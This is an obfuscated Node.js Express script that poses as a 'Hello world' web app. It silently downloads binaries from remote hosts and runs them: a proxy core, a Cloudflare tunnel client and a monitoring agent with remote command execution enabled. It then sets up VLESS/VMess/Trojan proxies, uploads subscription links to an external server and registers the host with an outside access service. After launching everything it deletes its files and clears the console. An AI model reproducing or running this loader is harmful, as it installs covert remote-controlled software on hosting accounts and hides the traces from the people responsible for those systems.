const _0x5e354a=_0x4edc;(function(_0x14a6d0,_0x275a65){const _0x2ac4ad=_0x4edc,_0x4c07b2=_0x14a6d0();while(!![]){try{const _0x4ca3d2=parseInt(_0x2ac4ad(0x237))/0x1+parseInt(_0x2ac4ad(0x210))/0x2*(parseInt(_0x2ac4ad(0x1ab))/0x3)+-parseInt(_0x2ac4ad(0x21b))/0x4*(-parseInt(_0x2ac4ad(0x219))/0x5)+parseInt(_0x2ac4ad(0x22c))/0x6*(parseInt(_0x2ac4ad(0x22e))/0x7)+parseInt(_0x2ac4ad(0x1f6))/0x8+-parseInt(_0x2ac4ad(0x1e3))/0x9+-parseInt(_0x2ac4ad(0x202))/0xa*(parseInt(_0x2ac4ad(0x213))/0xb);if(_0x4ca3d2===_0x275a65)break;else _0x4c07b2['push'](_0x4c07b2['shift']());}catch(_0x597ecb){_0x4c07b2['push'](_0x4c07b2['shift']());}}}(_0x2a84,0x5e416));const express=require(_0x5e354a(0x227)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5e354a(0x1fc)),{promisify}=require(_0x5e354a(0x1fa)),exec=promisify(require(_0x5e354a(0x205))[_0x5e354a(0x247)]),{execSync}=require(_0x5e354a(0x205)),UPLOAD_URL=process[_0x5e354a(0x1a0)][_0x5e354a(0x1e0)]||'',PROJECT_URL=process[_0x5e354a(0x1a0)][_0x5e354a(0x22a)]||'',AUTO_ACCESS=process['env'][_0x5e354a(0x218)]||![],FILE_PATH=process['env'][_0x5e354a(0x1eb)]||'./tmp',SUB_PATH=process[_0x5e354a(0x1a0)]['SUB_PATH']||_0x5e354a(0x1f4),PORT=process[_0x5e354a(0x1a0)][_0x5e354a(0x1d2)]||process[_0x5e354a(0x1a0)][_0x5e354a(0x1f7)]||0xbb8,UUID=process[_0x5e354a(0x1a0)][_0x5e354a(0x248)]||'5989327b-cf41-4e43-97c1-d60601a9d7a7',NEZHA_SERVER=process['env'][_0x5e354a(0x1d1)]||'',NEZHA_PORT=process['env'][_0x5e354a(0x1d8)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5e354a(0x1a0)]['ARGO_DOMAIN']||'',ARGO_AUTH=process['env'][_0x5e354a(0x1e7)]||'',ARGO_PORT=process[_0x5e354a(0x1a0)][_0x5e354a(0x1a5)]||0x1f41,CFIP=process['env'][_0x5e354a(0x222)]||_0x5e354a(0x241),CFPORT=process[_0x5e354a(0x1a0)][_0x5e354a(0x23f)]||0x1bb,NAME=process[_0x5e354a(0x1a0)][_0x5e354a(0x1c1)]||_0x5e354a(0x22f);!fs[_0x5e354a(0x1a4)](FILE_PATH)?(fs[_0x5e354a(0x1bf)](FILE_PATH),console[_0x5e354a(0x246)](FILE_PATH+_0x5e354a(0x20f))):console[_0x5e354a(0x246)](FILE_PATH+_0x5e354a(0x234));function generateRandomName(){const _0x49dc46=_0x5e354a,_0x2c0b06=_0x49dc46(0x1a6);let _0x246cd6='';for(let _0x26a55b=0x0;_0x26a55b<0x6;_0x26a55b++){_0x246cd6+=_0x2c0b06[_0x49dc46(0x1ae)](Math[_0x49dc46(0x19e)](Math[_0x49dc46(0x209)]()*_0x2c0b06['length']));}return _0x246cd6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4edc(_0x1fb4df,_0x328a74){const _0x2a84b7=_0x2a84();return _0x4edc=function(_0x4edcd7,_0x16dad1){_0x4edcd7=_0x4edcd7-0x197;let _0xdb763=_0x2a84b7[_0x4edcd7];return _0xdb763;},_0x4edc(_0x1fb4df,_0x328a74);}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x5e354a(0x224)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5e354a(0x224)](FILE_PATH,'sub.txt'),listPath=path[_0x5e354a(0x224)](FILE_PATH,'list.txt'),bootLogPath=path[_0x5e354a(0x224)](FILE_PATH,_0x5e354a(0x249)),configPath=path[_0x5e354a(0x224)](FILE_PATH,_0x5e354a(0x1d5));function deleteNodes(){const _0x19aad5=_0x5e354a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x28eb85;try{_0x28eb85=fs[_0x19aad5(0x1b2)](subPath,_0x19aad5(0x22b));}catch{return null;}const _0x40826f=Buffer[_0x19aad5(0x1f3)](_0x28eb85,'base64')[_0x19aad5(0x215)](_0x19aad5(0x22b)),_0x3e3954=_0x40826f['split']('\x0a')[_0x19aad5(0x236)](_0x476455=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x476455));if(_0x3e3954['length']===0x0)return;return axios[_0x19aad5(0x231)](UPLOAD_URL+_0x19aad5(0x1ea),JSON['stringify']({'nodes':_0x3e3954}),{'headers':{'Content-Type':_0x19aad5(0x201)}})[_0x19aad5(0x203)](_0x54eadb=>{return null;}),null;}catch(_0x176baf){return null;}}function cleanupOldFiles(){const _0x13aeeb=_0x5e354a;try{const _0x319b5b=fs['readdirSync'](FILE_PATH);_0x319b5b[_0x13aeeb(0x1b7)](_0x6ad00c=>{const _0x48bac1=_0x13aeeb,_0x55e458=path[_0x48bac1(0x224)](FILE_PATH,_0x6ad00c);try{const _0x231bfd=fs[_0x48bac1(0x214)](_0x55e458);_0x231bfd['isFile']()&&fs['unlinkSync'](_0x55e458);}catch(_0x33d4c4){}});}catch(_0x4ecdb7){}}app[_0x5e354a(0x206)]('/',function(_0x479c6c,_0x4cf087){const _0x2b7deb=_0x5e354a;_0x4cf087[_0x2b7deb(0x1dd)]('Hello\x20world!');});async function generateConfig(){const _0x4ef6ca=_0x5e354a,_0x271c1d={'log':{'access':_0x4ef6ca(0x1af),'error':_0x4ef6ca(0x1af),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4ef6ca(0x244)}],'decryption':_0x4ef6ca(0x1b0),'fallbacks':[{'dest':0xbb9},{'path':_0x4ef6ca(0x1c4),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4ef6ca(0x1e8),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4ef6ca(0x1b0)},'streamSettings':{'network':_0x4ef6ca(0x1f8),'security':_0x4ef6ca(0x1b0)}},{'port':0xbba,'listen':_0x4ef6ca(0x1e8),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4ef6ca(0x1b0)},'streamSettings':{'network':'ws','security':_0x4ef6ca(0x1b0),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4ef6ca(0x1da),_0x4ef6ca(0x230),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4ef6ca(0x1e8),'protocol':_0x4ef6ca(0x1bb),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4ef6ca(0x23b)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ef6ca(0x1da),'tls',_0x4ef6ca(0x1d6)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x4ef6ca(0x1d4),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4ef6ca(0x1b0),'wsSettings':{'path':_0x4ef6ca(0x1d9)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ef6ca(0x1da),_0x4ef6ca(0x230),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4ef6ca(0x1ba)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x4ef6ca(0x223),'tag':_0x4ef6ca(0x20c)}]};fs[_0x4ef6ca(0x19b)](path[_0x4ef6ca(0x224)](FILE_PATH,_0x4ef6ca(0x1d5)),JSON['stringify'](_0x271c1d,null,0x2));}function _0x2a84(){const _0x21cd1b=['?security=tls&sni=','/api/add-subscriptions','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','CFIP','blackhole','join','split','taskkill\x20/f\x20/im\x20','express','unlinkSync','response','PROJECT_URL','utf-8','551994XkHPNM','php\x20running\x20error:\x20','14pWKaSW','chao','tls','post','App\x20is\x20running','web\x20running\x20error:\x20','\x20already\x20exists','\x0avless://','filter','607052Szgshv','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20>\x20nul\x202>&1','set','/vmess-argo','&path=%2Fvless-argo%3Fed%3D2560#','?encryption=none&security=tls&sni=','2096','CFPORT','Skipping\x20adding\x20automatic\x20access\x20task','cdns.doon.eu.org','message','\x20is\x20running','xtls-rprx-vision','close','log','exec','UUID','boot.log','arm64','data','\x0a\x20\x20\x20\x20','http\x20server\x20is\x20running\x20on\x20port:','2053','Error\x20reading\x20boot.log:','tunnel.json','trim','writeFileSync','automatic\x20access\x20task\x20added\x20successfully','status','floor','\x0a\x20\x20\x0avmess://','env','text/plain;\x20charset=utf-8','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/v1','existsSync','ARGO_PORT','abcdefghijklmnopqrstuvwxyz','&path=%2Ftrojan-argo%3Fed%3D2560#','includes','Error\x20downloading\x20files:','stream','3vfgdNV','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://oooo.serv00.net/add-url','charAt','/dev/null','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','readFileSync','push','unshift','\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','forEach','ArgoDomain:','TunnelSecret','https+local://8.8.8.8/dns-query','vmess','2087','\x20-c\x20\x22','Error\x20executing\x20command:\x20','mkdirSync','\x0a\x20\x20\x0atrojan://','NAME','stringify','443','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','substring','platform','.exe\x20>\x20nul\x202>&1','pop','Empowerment\x20success\x20for\x20','arm','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/agent','base64','firefox','NEZHA_SERVER','SERVER_PORT','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','trojan','config.json','quic','\x22\x20>\x20/dev/null\x202>&1','NEZHA_PORT','/trojan-argo','http','unlink','2083','send','del\x20/f\x20/q\x20','fileUrl','UPLOAD_URL','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8443','4190481TzcgXn','\x0a\x20\x20credentials-file:\x20','/vmess-argo?ed=2560','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_AUTH','127.0.0.1','Nodes\x20uploaded\x20successfully','/api/delete-nodes','FILE_PATH','test','Unhandled\x20error\x20in\x20startserver:','basename','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','listen','length','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','from','sub','https://arm64.ssss.nyc.mn/v1','5852896JEkTvi','PORT','tcp','false','util','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','path','--tls','true','pkill\x20-f\x20\x22[','then','application/json','735610ZrcJMu','catch','https://amd64.ssss.nyc.mn/bot','child_process','get','map','error','random','win32','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','block','/config.json\x20>/dev/null\x202>&1\x20&','config.yaml','\x20is\x20created','208734sOwzqW','\x20failed:\x20','https://arm64.ssss.nyc.mn/web','121xNmaOA','statSync','toString','\x0aclient_secret:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','AUTO_ACCESS','5455CDVsxi','match','124oavwYb','https://arm64.ssss.nyc.mn/bot','clear','nohup\x20'];_0x2a84=function(){return _0x21cd1b;};return _0x2a84();}function getSystemArchitecture(){const _0x392730=_0x5e354a,_0xcd084f=os['arch']();return _0xcd084f===_0x392730(0x1cb)||_0xcd084f===_0x392730(0x24a)||_0xcd084f==='aarch64'?_0x392730(0x1cb):'amd';}function downloadFile(_0x3592c3,_0x3fd206,_0x18b3b8){const _0xa1ffb6=_0x5e354a,_0x5949bd=_0x3592c3;!fs[_0xa1ffb6(0x1a4)](FILE_PATH)&&fs[_0xa1ffb6(0x1bf)](FILE_PATH,{'recursive':!![]});const _0x2abcda=fs['createWriteStream'](_0x5949bd);axios({'method':_0xa1ffb6(0x206),'url':_0x3fd206,'responseType':_0xa1ffb6(0x1aa)})[_0xa1ffb6(0x200)](_0x42421d=>{const _0xcb9ec0=_0xa1ffb6;_0x42421d[_0xcb9ec0(0x24b)]['pipe'](_0x2abcda),_0x2abcda['on']('finish',()=>{const _0x1c0c20=_0xcb9ec0;_0x2abcda[_0x1c0c20(0x245)](),console[_0x1c0c20(0x246)]('Download\x20'+path[_0x1c0c20(0x1ee)](_0x5949bd)+'\x20successfully'),_0x18b3b8(null,_0x5949bd);}),_0x2abcda['on']('error',_0x3c3ecc=>{const _0x2a70cd=_0xcb9ec0;fs[_0x2a70cd(0x1db)](_0x5949bd,()=>{});const _0x39465d='Download\x20'+path['basename'](_0x5949bd)+'\x20failed:\x20'+_0x3c3ecc[_0x2a70cd(0x242)];console[_0x2a70cd(0x208)](_0x39465d),_0x18b3b8(_0x39465d);});})['catch'](_0x598c85=>{const _0x3a2afd=_0xa1ffb6,_0x37a7c2='Download\x20'+path['basename'](_0x5949bd)+_0x3a2afd(0x211)+_0x598c85[_0x3a2afd(0x242)];console[_0x3a2afd(0x208)](_0x37a7c2),_0x18b3b8(_0x37a7c2);});}async function downloadFilesAndRun(){const _0x36d1fb=_0x5e354a,_0x3715c6=getSystemArchitecture(),_0x335408=getFilesForArchitecture(_0x3715c6);if(_0x335408[_0x36d1fb(0x1f1)]===0x0){console[_0x36d1fb(0x246)](_0x36d1fb(0x1e6));return;}const _0x5c4f73=_0x335408[_0x36d1fb(0x207)](_0x13d3c6=>{return new Promise((_0xb6b5fe,_0x50e0bd)=>{const _0x219ea4=_0x4edc;downloadFile(_0x13d3c6['fileName'],_0x13d3c6[_0x219ea4(0x1df)],(_0x162fb1,_0x4e2a93)=>{_0x162fb1?_0x50e0bd(_0x162fb1):_0xb6b5fe(_0x4e2a93);});});});try{await Promise['all'](_0x5c4f73);}catch(_0x43bf4f){console[_0x36d1fb(0x208)](_0x36d1fb(0x1a9),_0x43bf4f);return;}function _0x94a581(_0x42786f){const _0x446deb=_0x36d1fb,_0x1f61fe=0x1fd;_0x42786f[_0x446deb(0x1b7)](_0x42fd4d=>{const _0x273d18=_0x446deb;fs[_0x273d18(0x1a4)](_0x42fd4d)&&fs['chmod'](_0x42fd4d,_0x1f61fe,_0x244753=>{const _0x3b81e6=_0x273d18;_0x244753?console[_0x3b81e6(0x208)]('Empowerment\x20failed\x20for\x20'+_0x42fd4d+':\x20'+_0x244753):console[_0x3b81e6(0x246)](_0x3b81e6(0x1ca)+_0x42fd4d+':\x20'+_0x1f61fe[_0x3b81e6(0x215)](0x8));});});}const _0x47247f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x94a581(_0x47247f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x375424=NEZHA_SERVER[_0x36d1fb(0x1a8)](':')?NEZHA_SERVER[_0x36d1fb(0x225)](':')[_0x36d1fb(0x1c9)]():'',_0x2b5827=new Set([_0x36d1fb(0x1c3),_0x36d1fb(0x1e2),_0x36d1fb(0x23e),'2087','2083',_0x36d1fb(0x197)]),_0x245647=_0x2b5827['has'](_0x375424)?_0x36d1fb(0x1fe):_0x36d1fb(0x1f9),_0x3c254e=_0x36d1fb(0x216)+NEZHA_KEY+_0x36d1fb(0x1e1)+NEZHA_SERVER+_0x36d1fb(0x221)+_0x245647+_0x36d1fb(0x20b)+UUID;fs[_0x36d1fb(0x19b)](path[_0x36d1fb(0x224)](FILE_PATH,_0x36d1fb(0x20e)),_0x3c254e);const _0x1fc5cc=_0x36d1fb(0x21e)+phpPath+_0x36d1fb(0x1bd)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1fc5cc),console[_0x36d1fb(0x246)](phpName+_0x36d1fb(0x243)),await new Promise(_0x5a458e=>setTimeout(_0x5a458e,0x3e8));}catch(_0x385143){console[_0x36d1fb(0x208)](_0x36d1fb(0x22d)+_0x385143);}}else{let _0x512a77='';const _0x4b6791=[_0x36d1fb(0x1c3),'8443',_0x36d1fb(0x23e),_0x36d1fb(0x1bc),_0x36d1fb(0x1dc),'2053'];_0x4b6791[_0x36d1fb(0x1a8)](NEZHA_PORT)&&(_0x512a77=_0x36d1fb(0x1fd));const _0x2d8de1=_0x36d1fb(0x21e)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x512a77+_0x36d1fb(0x1cc);try{await exec(_0x2d8de1),console[_0x36d1fb(0x246)](npmName+_0x36d1fb(0x243)),await new Promise(_0x4307be=>setTimeout(_0x4307be,0x3e8));}catch(_0x48489f){console[_0x36d1fb(0x208)]('npm\x20running\x20error:\x20'+_0x48489f);}}}else console[_0x36d1fb(0x246)](_0x36d1fb(0x238));const _0x10bad0='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x36d1fb(0x20d);try{await exec(_0x10bad0),console[_0x36d1fb(0x246)](webName+'\x20is\x20running'),await new Promise(_0x276e83=>setTimeout(_0x276e83,0x3e8));}catch(_0x1388be){console[_0x36d1fb(0x208)](_0x36d1fb(0x233)+_0x1388be);}if(fs[_0x36d1fb(0x1a4)](botPath)){let _0x3c2403;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3c2403=_0x36d1fb(0x1ef)+ARGO_AUTH;else ARGO_AUTH[_0x36d1fb(0x21a)](/TunnelSecret/)?_0x3c2403='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x3c2403='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3c2403+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x409ae2=>setTimeout(_0x409ae2,0x7d0));}catch(_0x4a0280){console[_0x36d1fb(0x208)](_0x36d1fb(0x1be)+_0x4a0280);}}await new Promise(_0x2f0f02=>setTimeout(_0x2f0f02,0x1388));}function getFilesForArchitecture(_0x5cfbfd){const _0x46ade5=_0x5e354a;let _0x590829;_0x5cfbfd===_0x46ade5(0x1cb)?_0x590829=[{'fileName':webPath,'fileUrl':_0x46ade5(0x212)},{'fileName':botPath,'fileUrl':_0x46ade5(0x21c)}]:_0x590829=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x46ade5(0x204)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4666e3=_0x5cfbfd==='arm'?_0x46ade5(0x1ce):'https://amd64.ssss.nyc.mn/agent';_0x590829[_0x46ade5(0x1b4)]({'fileName':npmPath,'fileUrl':_0x4666e3});}else{const _0x97c406=_0x5cfbfd===_0x46ade5(0x1cb)?_0x46ade5(0x1f5):_0x46ade5(0x1a3);_0x590829['unshift']({'fileName':phpPath,'fileUrl':_0x97c406});}}return _0x590829;}function argoType(){const _0x452fcf=_0x5e354a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x452fcf(0x246)](_0x452fcf(0x1f2));return;}if(ARGO_AUTH[_0x452fcf(0x1a8)](_0x452fcf(0x1b9))){fs[_0x452fcf(0x19b)](path[_0x452fcf(0x224)](FILE_PATH,_0x452fcf(0x199)),ARGO_AUTH);const _0x1acd7e=_0x452fcf(0x1a2)+ARGO_AUTH[_0x452fcf(0x225)]('\x22')[0xb]+_0x452fcf(0x1e4)+path[_0x452fcf(0x224)](FILE_PATH,_0x452fcf(0x199))+_0x452fcf(0x1b1)+ARGO_DOMAIN+_0x452fcf(0x1d3)+ARGO_PORT+_0x452fcf(0x1c5);fs['writeFileSync'](path[_0x452fcf(0x224)](FILE_PATH,'tunnel.yml'),_0x1acd7e);}else console[_0x452fcf(0x246)](_0x452fcf(0x1ac));}argoType();async function extractDomains(){const _0x2e7993=_0x5e354a;let _0x3a7ade;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3a7ade=ARGO_DOMAIN,console[_0x2e7993(0x246)]('ARGO_DOMAIN:',_0x3a7ade),await _0x19028f(_0x3a7ade);else try{const _0x5f2862=fs[_0x2e7993(0x1b2)](path[_0x2e7993(0x224)](FILE_PATH,'boot.log'),_0x2e7993(0x22b)),_0x2a8cb5=_0x5f2862[_0x2e7993(0x225)]('\x0a'),_0x39f58f=[];_0x2a8cb5[_0x2e7993(0x1b7)](_0x3ca4a8=>{const _0x52d316=_0x2e7993,_0x3286a3=_0x3ca4a8[_0x52d316(0x21a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3286a3){const _0x302942=_0x3286a3[0x1];_0x39f58f[_0x52d316(0x1b3)](_0x302942);}});if(_0x39f58f[_0x2e7993(0x1f1)]>0x0)_0x3a7ade=_0x39f58f[0x0],console[_0x2e7993(0x246)](_0x2e7993(0x1b8),_0x3a7ade),await _0x19028f(_0x3a7ade);else{console[_0x2e7993(0x246)](_0x2e7993(0x1fb)),fs[_0x2e7993(0x228)](path[_0x2e7993(0x224)](FILE_PATH,'boot.log'));async function _0x5edf87(){const _0x18f018=_0x2e7993;try{process[_0x18f018(0x1c7)]===_0x18f018(0x20a)?await exec(_0x18f018(0x226)+botName+_0x18f018(0x1c8)):await exec(_0x18f018(0x1ff)+botName[_0x18f018(0x1ae)](0x0)+']'+botName[_0x18f018(0x1c6)](0x1)+_0x18f018(0x1d7));}catch(_0x457aa1){}}_0x5edf87(),await new Promise(_0x36b1d0=>setTimeout(_0x36b1d0,0xbb8));const _0x2d8f86='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2e7993(0x1b6)+ARGO_PORT;try{await exec(_0x2e7993(0x21e)+botPath+'\x20'+_0x2d8f86+_0x2e7993(0x1b5)),console['log'](botName+_0x2e7993(0x243)),await new Promise(_0x129bee=>setTimeout(_0x129bee,0xbb8)),await extractDomains();}catch(_0x2e19de){console['error'](_0x2e7993(0x1be)+_0x2e19de);}}}catch(_0x1a9310){console['error'](_0x2e7993(0x198),_0x1a9310);}async function _0x19028f(_0x3d3c2f){const _0x394684=_0x2e7993,_0x35e244=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x496f88=_0x35e244[_0x394684(0x19a)](),_0xb9c744=NAME?NAME+'-'+_0x496f88:_0x496f88;return new Promise(_0x340166=>{setTimeout(()=>{const _0x21607f=_0x4edc,_0x5f549c={'v':'2','ps':''+_0xb9c744,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x21607f(0x1b0),'net':'ws','type':'none','host':_0x3d3c2f,'path':_0x21607f(0x1e5),'tls':'tls','sni':_0x3d3c2f,'alpn':'','fp':_0x21607f(0x1d0)},_0x1efafb=_0x21607f(0x235)+UUID+'@'+CFIP+':'+CFPORT+_0x21607f(0x23d)+_0x3d3c2f+_0x21607f(0x1cd)+_0x3d3c2f+_0x21607f(0x23c)+_0xb9c744+_0x21607f(0x19f)+Buffer[_0x21607f(0x1f3)](JSON[_0x21607f(0x1c2)](_0x5f549c))[_0x21607f(0x215)]('base64')+_0x21607f(0x1c0)+UUID+'@'+CFIP+':'+CFPORT+_0x21607f(0x21f)+_0x3d3c2f+'&fp=firefox&type=ws&host='+_0x3d3c2f+_0x21607f(0x1a7)+_0xb9c744+_0x21607f(0x24c);console['log'](Buffer[_0x21607f(0x1f3)](_0x1efafb)[_0x21607f(0x215)](_0x21607f(0x1cf))),fs[_0x21607f(0x19b)](subPath,Buffer[_0x21607f(0x1f3)](_0x1efafb)[_0x21607f(0x215)](_0x21607f(0x1cf))),console[_0x21607f(0x246)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x21607f(0x206)]('/'+SUB_PATH,(_0x3ffd3d,_0x58c766)=>{const _0x57ebde=_0x21607f,_0x26405a=Buffer[_0x57ebde(0x1f3)](_0x1efafb)[_0x57ebde(0x215)](_0x57ebde(0x1cf));_0x58c766[_0x57ebde(0x23a)]('Content-Type',_0x57ebde(0x1a1)),_0x58c766[_0x57ebde(0x1dd)](_0x26405a);}),_0x340166(_0x1efafb);},0x7d0);});}}async function uploadNodes(){const _0x42cc53=_0x5e354a;if(UPLOAD_URL&&PROJECT_URL){const _0x47d7c0=PROJECT_URL+'/'+SUB_PATH,_0x4003c1={'subscription':[_0x47d7c0]};try{const _0x353ffb=await axios[_0x42cc53(0x231)](UPLOAD_URL+_0x42cc53(0x220),_0x4003c1,{'headers':{'Content-Type':_0x42cc53(0x201)}});return _0x353ffb&&_0x353ffb['status']===0xc8?(console[_0x42cc53(0x246)]('Subscription\x20uploaded\x20successfully'),_0x353ffb):null;}catch(_0xded713){if(_0xded713[_0x42cc53(0x229)]){if(_0xded713[_0x42cc53(0x229)][_0x42cc53(0x19d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x520f27=fs[_0x42cc53(0x1b2)](listPath,_0x42cc53(0x22b)),_0x2a2bc4=_0x520f27[_0x42cc53(0x225)]('\x0a')[_0x42cc53(0x236)](_0x1f6fd4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x42cc53(0x1ec)](_0x1f6fd4));if(_0x2a2bc4['length']===0x0)return;const _0x422dea=JSON['stringify']({'nodes':_0x2a2bc4});try{const _0x5e2613=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x422dea,{'headers':{'Content-Type':_0x42cc53(0x201)}});return _0x5e2613&&_0x5e2613['status']===0xc8?(console['log'](_0x42cc53(0x1e9)),_0x5e2613):null;}catch(_0x3cb2e4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x19acc3=_0x4edc,_0x10303b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x10303b[_0x19acc3(0x1b3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x10303b[_0x19acc3(0x1b3)](phpPath);process['platform']===_0x19acc3(0x20a)?exec(_0x19acc3(0x1de)+_0x10303b[_0x19acc3(0x224)]('\x20')+_0x19acc3(0x239),_0x41e5ac=>{const _0x344cce=_0x19acc3;console[_0x344cce(0x21d)](),console[_0x344cce(0x246)](_0x344cce(0x232)),console[_0x344cce(0x246)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x10303b['join']('\x20')+'\x20>/dev/null\x202>&1',_0x396eb4=>{const _0x1639b3=_0x19acc3;console['clear'](),console[_0x1639b3(0x246)](_0x1639b3(0x232)),console[_0x1639b3(0x246)](_0x1639b3(0x217));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2489be=_0x5e354a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2489be(0x246)](_0x2489be(0x240));return;}try{const _0x38f605=await axios[_0x2489be(0x231)](_0x2489be(0x1ad),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2489be(0x246)](_0x2489be(0x19c)),_0x38f605;}catch(_0x448e30){return console[_0x2489be(0x208)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x448e30[_0x2489be(0x242)]),null;}}async function startserver(){const _0x31fc7e=_0x5e354a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x9585b){console[_0x31fc7e(0x208)]('Error\x20in\x20startserver:',_0x9585b);}}startserver()[_0x5e354a(0x203)](_0x42f36e=>{const _0x118e2b=_0x5e354a;console['error'](_0x118e2b(0x1ed),_0x42f36e);}),app[_0x5e354a(0x1f0)](PORT,()=>console['log'](_0x5e354a(0x24d)+PORT+'!'));
